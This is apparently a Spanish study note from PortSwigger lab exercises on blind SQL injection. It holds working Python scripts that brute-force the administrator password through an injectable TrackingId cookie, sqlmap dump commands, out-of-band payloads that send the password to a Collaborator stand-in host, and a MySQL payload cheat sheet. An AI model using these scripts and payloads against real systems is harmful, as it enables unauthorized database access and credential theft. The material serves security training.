# BLIND SQLi

## Table of contents

- [BLIND SQLi](#blind-sqli)
  - [CONNECTING MSSQL](#connecting-mssql)
    - [WITH POWERSHELL](#with-powershell)
    - [WITH IMPACKET](#with-impacket)
  - [Blind SQLi Introduction](#blind-sqli-introduction)
  - [Blind Boolean-based SQLi](#blind-boolean-based-sqli)
    - [Identificacion](#identificacion)
    - [Explotacion](#explotacion)
      - [Blind SQL injection with conditional responses (Postgre/MySQL)](#blind-sql-injection-with-conditional-responses-postgremysql)
      - [Blind SQL injection with conditional errors (Oracle)](#blind-sql-injection-with-conditional-errors-oracle)
      - [Blind SQL injection with time delays and information retrieval (Postgres)](#blind-sql-injection-with-time-delays-and-information-retrieval-postgres)
      - [Blind SQL injection with out-of-band interaction](#blind-sql-injection-with-out-of-band-interaction)
      - [Blind SQL injection with out-of-band data exfiltration](#blind-sql-injection-with-out-of-band-data-exfiltration)
  - [BLIND SQL PAYLOADS](#blind-sql-payloads)
    - [CONDITIONAL RESPONSE (MySQL)](#conditional-response-mysql)

## CONNECTING MSSQL

### WITH POWERSHELL

```powershell
sqlcmd -S 'SQL01' -U 'thomas' -P 'TopSecretPassword23!' -d bsqlintro -W
```

 - `-S`: indicamos el servidor.
 - `-U`: indicamos usuario.
 - `-P`: indicamos contraseña.
 - `-d` : indicamos la base de datos
 - `-W`: elimina los espacios finales, lo que hace que la salida sea un poco más fácil de leer.

>[!note]
>Para ingresar consultas debemos terminarlas en `;`. Despues colocar la palagra reservada `GO`.

### WITH IMPACKET

[MSSQLClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (o `impacket-mssqlclient`) es parte del conjunto de herramientas de [Impacket](https://github.com/fortra/impacket) que viene preinstalado en muchas distribuciones de Linux relacionadas con la seguridad. Podemos usarlo para interactuar con el control remoto `MSSQL` sin tener que usar Windows.

```bash
impacket-mssqlclient thomas:'TopSecretPassword23!'@SQL01 -db bsqlintro
```


>[!note]
>Para ingresar consultas debemos terminarlas en `;`.

## Blind SQLi Introduction

`Blind SQL injection` es un tipo de inyección SQL en el que al atacante no se le devuelven los resultados de la consulta SQL relevante y debe confiar en las diferencias en la página para inferir los resultados de la consulta. 

**Un ejemplo de esto podría ser un formulario de inicio de sesión que utiliza nuestra entrada en una consulta de base de datos pero no nos devuelve el resultado.**

Las dos categorías de `Blind SQL Injection` son:

- `Boolean-based`: también conocido como `Content-based`, que es cuando el atacante busca diferencias en la respuesta (por ejemplo, Longitud de la respuesta) para saber si la consulta inyectada devolvió `True` o `False`.
- `Time-based`, que es cuando el atacante inyecta comandos `sleep` en la consulta con diferentes duraciones y luego verifica el tiempo de respuesta para indicar si una consulta se evalúa como `True` o `False`.

## Blind Boolean-based SQLi

### Identificacion

>[!note]
>El siguiente ejemplo es en un formulario de registro que al colocar el username de la cuenta a crear comprueba en la base de datos si el username ya fue registrado o no.

1. La identificacion comienza encontrando un posible campo vulnerable, puede ser una parametro que sabemos que se esta utilizando para consultar la base de datos.

![[Pasted image 20230201155751.png]]

2. Una vez identificado el campo vulnerable probamos enviar un dato esperado y uno erroneo o inexistente y buscamos diferencias en la respuesta.

(Interceptando la peticion)

**RESPUESTA 1**

![[Pasted image 20230201160011.png]]

**RESPUESTA 2**

![[Pasted image 20230201160045.png]]

3. Tenemos que usar una sentencia `AND` para jugar con un condicional que nos devuelve un verdadero o un falso. Vamos a utilizar la logica computacional `AND`:

|logica|resultado|
|:------:|:-----:|
|V y V|V|
|V y F|F|
|F y V|F|
|F y F|V|

4. Como esta tecnica esta basado en valores booleanos vamos a usar un payload que siempre retorne **True** y otro que siempre reotrne **False** como nuestra PoC:

imaginemos cual debe ser la consulta que se esta realizando por debajo:

```sql
SELECT Username FROM Users WHERE Username = '<username>' ...
```

**_Entonces si ingresamos un valor que existe en la DB es algo verdadero_**

```bash
#Esto retorna True: 
#V y V =V (con un username ya registrado)
<username exist>' and 1=1-- -
```

![[Pasted image 20230201162513.png]]

```bash
#Esto retorna False: 
#F o V = V (con un username no registrado)
#F o F = F (con un username no registrado)
<username no exist>' and 1=1-- -
<username no exist>' and 0=1-- -
```

![[Pasted image 20230201162536.png]]

![[Pasted image 20230201162602.png]]

si se dan cuenta tenemos control de la segunda condicional en el `AND` al colocar un username que existe, de poner una sentencia que existe ya sabes la respuesta para validar si es cierto o no. Mediante clausulas como `and (<query>)=<something>` podemos obtener informacion de la base de datos.

### Explotacion

#### Blind SQL injection with conditional responses (Postgre/MySQL)

- Hay una cookie llamada **TrackingId** vulnerable a Blind SQLi.
- No hay un retorno de la consulta ni tampoco se muestra mensajes de error.
- el texto **Welcome back** se muestra cuando la consulta es verdadera (existe)

esta es la consulta original:

![[Pasted image 20230212171937.png]]

la consolta por detras podemos intuir que es algo asi:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='zaPfzRCR8IdECfqg'
```

`TrackingId='zaPfzRCR8IdECfqg'` es verdadero (existe) y por eso nos muestra el mensaje:

![[Pasted image 20230212172156.png]]

si agregamos una letra o numero, seguro seria un **TrackingId** invalido y no retornara el mensaje:

![[Pasted image 20230212172245.png]]

bajo este criterio podriamos jugar con condicionales:

>[!note]
>Tenemos que usar el operador `and` en estos casos.

```bash
TrackingId='zaPfzRCR8IdECfqg' and 1=1-- - # V y V = V (con mensaje)
TrackingId='zaPfzRCR8IdECfqg' and 2=1-- - # V y F = F (sin mensaje)
```

![[Pasted image 20230212172425.png]]

![[Pasted image 20230212172447.png]]

podemos empezar a descubrir informacion mediante subquery:

```bash
TrackingId='zaPfzRCR8IdECfqg' and (SUB-QUERY)=1-- -
```

>[!important]
>Mediante Blind SQLi es complicado poder enumerar toda la base de datos, puede ver la seccion de [[#BLIND SQL PAYLOADS]] para intentar descubrir database, tables, colums, data.

Existe una tabla llamada `users` con los campos `username` y `password`, necesitamos descubrir la contraseña del usuario `administrator`.

nos creamos el siguiente script en python3:

```bash
pip3 install pwntools
```

descubrimiento de la longitud de la contraseña:

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

#funcion para contral Ctrl+C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
#ctr+c
signal.signal(signal.SIGINT, def_handler)

#URL a atacar
main_url = "https://0a1c006403ea1237c1a02269008e0063.web-security-academy.net/"

def makeRequest():
	#variable que almacenara la longitud
    logitud = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Longitud")

	#ciclo para validar la longitud entre 1 y 50 caracteres
    for position in range(1,50):
	    # el blind sqli se encunetra en las cookies
        cookies = {
            'TrackingId':"KGzeQcM6ttE4INAX' and (select length(password) from users where username='administrator')='%d'-- -" % (position),
            'session':'pC3y2SD373VSLw07MM4JXz9I1wgVEEKB'
        }

        p1.status(cookies['TrackingId'])

		# se realiza el request con la inyeccion
        r = requests.get(main_url, cookies=cookies)

		#verificamos si tiene el mensaje que diferencia la solicitud
		#recordemos que si muestra el mensaje es que el dato es correcto
        if "Welcome back!" in r.text:
            logitud = str(position)
            p2.status(logitud)
            break


#inicio del flujo
if __name__ == '__main__':
    makeRequest()
```

![[Pasted image 20230212200728.png]]

la contraseña tiene una longitud de 20 caracteres, adaptamos el script para descubrir la contraseña:

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#ctr+c
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a1c006403ea1237c1a02269008e0063.web-security-academy.net/"

# string.punctuation (caracteres especiales)
# string.digits (digitos 0-9)
# string.ascii_lowercase (minusculas a-z)
# string.ascii_uppercase (mayusculas A-Z)
# string.printable (todo 0-9a-zA-Z mas caracteres especiales)
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:
            cookies = {
                'TrackingId':"KGzeQcM6ttE4INAX' and (select substring(password,%d,1) from users where username='administrator')='%s'-- -" % (position,character),
                'session':'pC3y2SD373VSLw07MM4JXz9I1wgVEEKB'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break


if __name__ == '__main__':
    makeRequest()
```

![[Pasted image 20230212201032.png]]

logramos encontrar la contraseña del usuario administrator:

![[Pasted image 20230212201125.png]]

#### Blind SQL injection with conditional errors (Oracle)

La inyeccion sucede de igual manera en la cookie **TrackingId**.

En este caso no hay una respuesta diferente en el response de la pagina, simplemente nos mostrara un estado 500 internal server error en caso de haber un error, podemos aprovechar esto para obtener informacion:

basandonos en la siguiente consulta que hace la pagina:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='zaPfzRCR8IdECfqg'
```

1 comilla simple provocaria un error:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='zaPfzRCR8IdECfqg''
```

![[Pasted image 20230212232612.png]]

pero 2 comillas simples ya no porque no se queda una sin cerrar:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='zaPfzRCR8IdECfqg'''
```

![[Pasted image 20230212232709.png]]

como vemos que nos muestra un codigo 500 podemos aprovechar el siguiente payload PoC:

```bash
' or (select case when (1=1) then to_char(1/0) else 'a' end from dual)='a'--
```

estamos haciendo un select con un condicional, el **from dual** es porque es una DB oracle, pero como sabemos que tabla y usuario existe podriamos usar eso.

En este caso el condicional si **1=1** es verdadero mostrara un error intencionalmente **to_char(1/0)** esto convierte a char una division que saldria un error, caso contrario (else) imprime una **'a'** que es comparado contra una **'a'** lo que es verdadero y no muestra el error 500:

![[Pasted image 20230212234224.png]]

![[Pasted image 20230212234256.png]]

podemos usar la tabla y el usuario que sabemos que eisten:

```bash
' or (select case when (1=1) then to_char(1/0) else 'a' end from users where username='administrator')='a'--
```

creamos el siguiente script para determinar la longitud de la contraseña:

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#ctr+c
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ad9007504cf9510c185dab5006f00d2.web-security-academy.net/"

def makeRequest():

    logitud = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Longitud")

    for position in range(1,50):
        cookies = {
            'TrackingId':"HuIEFSOLZ2xR1Kb5' or (select case when (length(password)=%d) then to_char(1/0) else 'a' end from users where username='administrator')='a'--" % (position),
            'session':'e7pYDD294jhx64lugK7Z7SDnBaPwqTX5'
        }

        p1.status(cookies['TrackingId'])

        r = requests.get(main_url, cookies=cookies)

        if r.status_code==500:
            logitud = str(position)
            p2.status(logitud)
            break


if __name__ == '__main__':
    makeRequest()
```

![[Pasted image 20230212235515.png]]

ahora que sabemosla longitud creamos el siguiente script para descubrir su contraseña:

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#ctr+c
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ad9007504cf9510c185dab5006f00d2.web-security-academy.net/"

# string.punctuation (caracteres especiales)
# string.digits (digitos 0-9)
# string.ascii_lowercase (minusculas a-z)
# string.ascii_uppercase (mayusculas A-Z)
# string.printable (todo 0-9a-zA-Z mas caracteres especiales)
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:
            cookies = {
            'TrackingId':"HuIEFSOLZ2xR1Kb5' or (select case when (substr(password,%d,1)='%s') then to_char(1/0) else 'a' end from users where username='administrator')='a'--" % (position,character),
            'session':'e7pYDD294jhx64lugK7Z7SDnBaPwqTX5'
        }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if r.status_code==500:
                password += character
                p2.status(password)
                break


if __name__ == '__main__':
    makeRequest()
```

![[Pasted image 20230213002028.png]]

con SQLMap tambien se puede obtener la informacion:

```bash
sqlmap 'https://0ad9007504cf9510c185dab5006f00d2.web-security-academy.net/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: es-ES,es;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: TrackingId=FNun87616K6eRHFA*; session=gD5ZAWUUxcICiQao7t2sPLS9LyThB7VN' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: none' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --compressed --dbms=oracle --level=5 --risk=3 --random-agent -T users --dump
```

![[Pasted image 20230213002122.png]]

#### Blind SQL injection with time delays and information retrieval (Postgres)

- [Postgresql Time Blind Payloadallthething](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind)

PoC:

```bash
' and PG_SLEEP(10)--
' or PG_SLEEP(10)--
' and 'a'=(SELECT 'a' FROM PG_SLEEP(10))--
' or 'a'=(SELECT 'a' FROM PG_SLEEP(10))--
'%3b(select 1 from pg_sleep(7))--                  #%3B = ;
```

retrive information:

```bash
'%3b(select case when (length(password)=20) then pg_sleep(7) else pg_sleep(0) end from users where username='administrator')-- -

'||(select case when (length(password)=20) then pg_sleep(7) else pg_sleep(0) end from users where username='administrator')-- -
```

**lognitud de contraseña**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

#funcion para contral Ctrl+C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
#ctr+c
signal.signal(signal.SIGINT, def_handler)

#URL a atacar
main_url = "https://0a3e00160399f6f1c22e4d80002d0035.web-security-academy.net//"

def makeRequest():
	#variable que almacenara la longitud
    logitud = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Longitud")

	#ciclo para validar la longitud entre 1 y 50 caracteres
    for position in range(1,50):
	    # el blind sqli se encunetra en las cookies
        cookies = {
            'TrackingId':"5wIAPX6GqgqAWVsT'||(select case when (length(password)=%d) then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -" % (position),
            'session':'oja3JaI322kOOkW9b3oUJaoodaQ9bXE8'
        }

        p1.status(cookies['TrackingId'])

        time_start = time.time()

		# se realiza el request con la inyeccion
        r = requests.get(main_url, cookies=cookies)

        time_end = time.time()
	
		#verificamos si tiene el mensaje que diferencia la solicitud
		#recordemos que si muestra el mensaje es que el dato es correcto
        if time_end - time_start  > 3:
            logitud = str(position)
            p2.status(logitud)
            break

#inicio del flujo
if __name__ == '__main__':
    makeRequest()
```

![[Pasted image 20230213220445.png]]

**brute force password attack**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#ctr+c
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a3e00160399f6f1c22e4d80002d0035.web-security-academy.net/"

# string.punctuation (caracteres especiales)
# string.digits (digitos 0-9)
# string.ascii_lowercase (minusculas a-z)
# string.ascii_uppercase (mayusculas A-Z)
# string.printable (todo 0-9a-zA-Z mas caracteres especiales)
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:
            cookies = {
                'TrackingId':"5wIAPX6GqgqAWVsT'||(select case when (substring(password,%d,1)='%s') then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -" % (position,character),
                'session':'oja3JaI322kOOkW9b3oUJaoodaQ9bXE8'
            }

            p1.status(cookies['TrackingId'])
			
            start_time = time.time()
            r = requests.get(main_url, cookies=cookies)
            end_time = time.time()

            if end_time - start_time > 3:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeRequest()
```

![[Pasted image 20230213225050.png]]

SQLMap:

```bash
sqlmap 'https://0a8200630423aa73c2fedf57003800f1.web-security-academy.net/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: TrackingId=KfmqSSgWhtBjAqao*; session=tl6y6P0pJhgfwvFVdui2x5YcWuShba7J' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' --dbms=postgres --level=5 --risk=3 --dump --technique=T -T users
```

![[Pasted image 20230213164846.png]]

####  Blind SQL injection with out-of-band interaction

- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

- cuando no se nos muestra un mensaje diferente en la respuesta.
- no podemos identificar un error 500.
- no podemos ver un retraso en el tiempo de respuesta

podemos intentar un blind SQLi OOB.

tenemos que URL encodearlo:

```bash
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

![[Pasted image 20230213222601.png]]

![[Pasted image 20230213222621.png]]


#### Blind SQL injection with out-of-band data exfiltration

- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

como un DNS exfiltration, podemos concatenar el resultado de una consulta como un subdominio:

```bash
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

```bash
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

![[Pasted image 20230213223044.png]]

![[Pasted image 20230213223107.png]]

## BLIND SQL PAYLOADS

### CONDITIONAL RESPONSE (MySQL)

```bash
#database
' and (select substring(database(),1,1))='a'-- -
```

```bash
#tables
' and (select substring(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a'-- -

' and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)
```

```bash
#columns
' and (select substring(column_name,1,1) from information_schema.columns where table_name='TABLE-NAME' limit 0,1)='a'-- -
```

```bash
#data
#field length
' and (select length(password) from users where username='administrator')=0-- -
```

```bash
#data
#field value
' and (select substring(password,1,1) from users where username='administrator')='a'-- -
```